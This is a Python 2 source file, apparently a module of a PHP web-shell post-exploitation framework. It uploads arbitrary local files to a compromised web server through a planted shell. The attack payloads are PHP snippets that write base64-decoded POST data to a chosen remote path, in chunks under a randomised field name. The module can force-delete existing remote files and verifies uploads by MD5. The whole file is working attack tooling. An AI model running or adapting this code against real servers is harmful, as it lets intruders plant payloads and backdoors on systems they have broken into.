'''
Created on 23/set/2011

@author: norby
'''

from core.moduleprobeall import ModuleProbeAll
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.vector import VectorList, Vector
from core.http.cmdrequest import CmdRequest, NoDataException
from base64 import b64encode
from random import choice
from hashlib import md5
from core.savedargparse import SavedArgumentParser as ArgumentParser
from argparse import SUPPRESS

WARN_FILE_EXISTS = 'File exists'
WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_MD5_MISMATCH = 'MD5 hash mismatch'
WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'

def b64_chunks(l, n):
    return [b64encode(l[i:i+n]) for i in range(0, len(l), n)]

class Upload(ModuleProbeAll):
    '''Upload binary/ascii file to the target filesystem'''


    vectors = VectorList([
        Vector('shell.php', 'file_put_contents', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ]),
        Vector('shell.php', 'fwrite', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
        ])

    support_vectors = VectorList([
        Vector('file.rm',  "rm", "$rpath -recursive".split(' ')),
        Vector('file.check',  "check_exists", "$rpath exists".split(' ')),
        Vector('file.check', 'md5', '$rpath md5'.split(' ')),
    ])

    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('lpath')
    argparser.add_argument('rpath')
    argparser.add_argument('-chunksize', type=int, default=1024)
    argparser.add_argument('-content', help=SUPPRESS)
    argparser.add_argument('-vector', choices = vectors.get_names()),
    argparser.add_argument('-force', action='store_true')

    def _load_local_file(self):

        if not self.args['content']:
            try:
                local_file = open(self.args['lpath'], 'r')
            except Exception, e:
                raise ProbeException(self.name,  '\'%s\' %s' % (self.args['lpath'], WARN_NO_SUCH_FILE))

            self.args['content'] = local_file.read()
            local_file.close()
        
        
        self.args['content_md5'] = md5(self.args['content']).hexdigest()
        self.args['content_chunks'] = self.__chunkify(self.args['content'], self.args['chunksize'])
        self.args['post_field'] = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])

    def _check_remote_file(self):                
        if self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
            if not self.args['force']:
                raise ProbeException(self.name, '%s. Overwrite \'%s\' using -force option.' % (WARN_FILE_EXISTS, self.args['rpath']))
            else:
                self.support_vectors.get('rm').execute(self.modhandler, {'rpath' : self.args['rpath']})
                
    def _prepare_probe(self):

        self._load_local_file()
        self._check_remote_file()
        
    def _execute_vector(self):       

        self._result = False

        i=1
        for chunk in self.args['content_chunks']:
            
            args_formats = { 'rpath' : self.args['rpath'], 'post_field' : self.args['post_field'], 'data' : chunk }
            self.current_vector.execute(self.modhandler, args_formats)  
            
            i+=1

    def _verify_execution(self):
    
        if self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
            if self.support_vectors.get('md5').execute(self.modhandler, {'rpath' : self.args['rpath']}) == self.args['content_md5']:
                self._result = True
                raise ProbeSucceed(self.name, 'File uploaded')
            else:
                self.mprint('\'%s\' %s' % (self.args['rpath'], WARN_MD5_MISMATCH))

    def _verify_probe(self):
        if not self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['rpath'], WARN_UPLOAD_FAIL))

    def __chunkify(self, file_content, chunksize):

        content_len = len(file_content)
        if content_len > chunksize:
            content_chunks = b64_chunks(file_content, chunksize)
        else:
            content_chunks = [ b64encode(file_content) ]

        numchunks = len(content_chunks)
        if numchunks > 20:
            self.mprint('Warning: uploading %iB in %i chunks of %sB. Increase chunk size with option \'-chunksize\' to reduce upload time' % (content_len, numchunks, self.args['chunksize']) )

        return content_chunks


